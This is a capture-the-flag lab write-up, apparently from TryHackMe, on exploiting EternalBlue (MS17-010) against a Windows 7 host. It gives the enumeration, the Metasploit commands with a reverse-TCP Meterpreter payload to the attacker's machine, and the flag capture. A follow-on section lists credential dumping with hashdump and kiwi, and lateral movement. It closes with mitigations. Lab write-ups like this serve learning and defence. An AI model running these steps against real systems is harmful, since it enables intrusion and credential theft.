# Exploit Write-up — EternalBlue (MS17-010) → Meterpreter

**Target:** `10.201.65.196`
**Hostname / NetBIOS:** `JON-PC`
**Environment discovered:** Windows 7 x64 SP1 (Workgroup)
**Result:** Obtained a x64 `meterpreter` session and retrieved `flag.txt` (content: `THM-5455554845`).

---

## Summary

Network and SMB/RDP enumeration revealed the target exposing SMB (TCP/445) and RDP (TCP/3389). RDP required NLA/CredSSP, but SMB was vulnerable to **MS17-010 (EternalBlue)**. Using Metasploit’s `exploit/windows/smb/ms17_010_eternalblue` with an x64 Meterpreter payload yielded a stable session. The user flag was located and captured.

---

## Reconnaissance & Enumeration

**Commands and notable outputs:**

1. Quick port scan

```bash
nmap -F 10.201.65.196
# Open ports found: 135, 139, 445, 3389, 49152-49155
```

2. NetBIOS & SMB checks

```bash
nbtscan 10.201.65.196
# NetBIOS Name: JON-PC

smbclient -L //10.201.65.196 -N
# Anonymous login successful
# SMB1 workgroup listing fell back and failed (SMB1 disabled / fallback error)
```

3. Deeper SMB/RDP enumeration

```bash
enum4linux -a 10.201.65.196
# Revealed WORKGROUP and JON-PC; many RPC/SMB calls returned ACCESS_DENIED (partial null session)

nmap -p3389 --script=rdp-enum-encryption 10.201.65.196
# RDP: CredSSP (NLA) required

nmap -p445 --script=smb-vuln-ms17-010 10.201.65.196
# Script result: VULNERABLE to MS17-010 (CVE-2017-0143)
```

**Key findings:**

* SMB is vulnerable to MS17-010.
* RDP requires NLA (not immediately exploitable).
* Null-session allowed but restricted (`ACCESS_DENIED` for many operations).

---

## Exploitation (EternalBlue via Metasploit)

**Repro steps:**

1. Start Metasploit

```bash
msfconsole -q
```

2. Configure and run EternalBlue

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.201.65.196
set LHOST <KALI_IP>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
run
```

* Selected an x64 payload based on target enumeration (Windows 7 x64).
* If target was x86, use the x86 meterpreter payload instead.

**Outcome:** a stable x64 `meterpreter` session was obtained.

---

## Post-Exploitation (initial actions)

**Stabilize and enumerate:**

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > migrate <pid>  # to a stable process
```

**Find and capture the flag:**

```bash
meterpreter > cd C:\Users\Jon\Documents
meterpreter > cat flag.txt
# => THM-5455554845
```

---

## Next steps (recommended)

1. **Privilege escalation to SYSTEM** (if additional data required):

   * `meterpreter > getsystem`
   * Use `post/multi/recon/local_exploit_suggester` to discover applicable local exploits.

2. **Credentials & secrets**

   * If elevated: `meterpreter > hashdump` or `load kiwi` + `kiwi_cmd "sekurlsa::logonpasswords"` to extract NTLM hashes and credentials.

3. **Lateral movement**

   * Use dumped creds with `psexec`, `wmic`, or `winrm` to access other hosts.
   * Use `meterpreter` `portfwd`/`autoroute` to pivot into internal networks.

4. **Data discovery**

   * Search for config files, backups, or scripts with credentials in `C:\Users`, `C:\ProgramData`, or application folders.

---

## Evidence / Important outputs (captured)

* `nbtscan` → `JON-PC`
* `nmap --script=smb-vuln-ms17-010` → `VULNERABLE` (CVE-2017-0143)
* `meterpreter sysinfo` → `Windows 7 (6.1 Build 7601, Service Pack 1) — x64`
* `cat flag.txt` → `THM-5455554845`
* Obtained a x64 Meterpreter session

---

## Mitigation & Recommendations

* **Patch systems**: Apply MS17-010 (March 2017) patch or later Windows updates.
* **Disable SMBv1**: Remove legacy SMBv1 protocol unless absolutely required.
* **Network segmentation**: Block SMB (TCP/445) from untrusted networks; restrict RDP access behind VPN + MFA.
* **Harden authentication**: Enforce strong passwords, disable unnecessary local admin accounts, and prefer Kerberos.
* **Endpoint detection**: Use EDR/antivirus to detect abnormal LSASS access and suspicious persistence attempts.

---

## References

* Microsoft MS17-010 (EternalBlue) — CVE-2017-0143.
* Metasploit module: `exploit/windows/smb/ms17_010_eternalblue`.

---

*This write-up was created for an authorized lab environment (TryHackMe) and is intended for educational/pentest documentation purposes only.*
